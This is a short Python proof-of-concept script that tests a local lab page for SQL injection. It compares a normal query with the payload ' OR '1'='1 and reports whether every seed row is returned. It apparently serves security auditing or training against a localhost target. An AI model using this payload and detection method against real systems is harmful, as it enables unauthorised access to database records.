#!/usr/bin/env python3
import urllib.request
import urllib.parse

BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"

def fetch(name):
    url = BASE + "?" + urllib.parse.urlencode({"name": name})
    req = urllib.request.Request(url, headers={"User-Agent": "S001-audit-poc"})
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except Exception as e:
        return None, "REQUEST_ERROR: %r" % (e,)

def markers(body):
    keys = ["ID 1", "Alice", "ID 2", "Bob", "ID 3", "Carol", "查询失败"]
    return {k: (k in body) for k in keys}

status1, body1 = fetch("Alice")
print("[normal] status =", status1)
print("[normal] markers =", markers(body1))
print("[normal] body snippet =", body1[:300].replace("\n", " "))

payload = "' OR '1'='1"
status2, body2 = fetch(payload)
print("[test] payload =", payload)
print("[test] status =", status2)
print("[test] markers =", markers(body2))
print("[test] body snippet =", body2[:500].replace("\n", " "))

normal_ok = ("Alice" in body1) and ("Bob" not in body1) and ("Carol" not in body1)
injected = all(x in body2 for x in ["Alice", "Bob", "Carol"]) and ("查询失败" not in body2)

print("[observe] normal_only_Alice =", normal_ok)
print("[observe] test_returns_all_seed_rows =", injected)

if injected:
    print("结论：测试输入使 WHERE 条件结构变化并返回多行，符合 SQL 注入可达的预期。")
else:
    print("结论：未观察到预期多行返回；检查入口、数据库预置数据、mysqli 连接与是否启用转义，不以 HTTP 200 作为成功条件。")
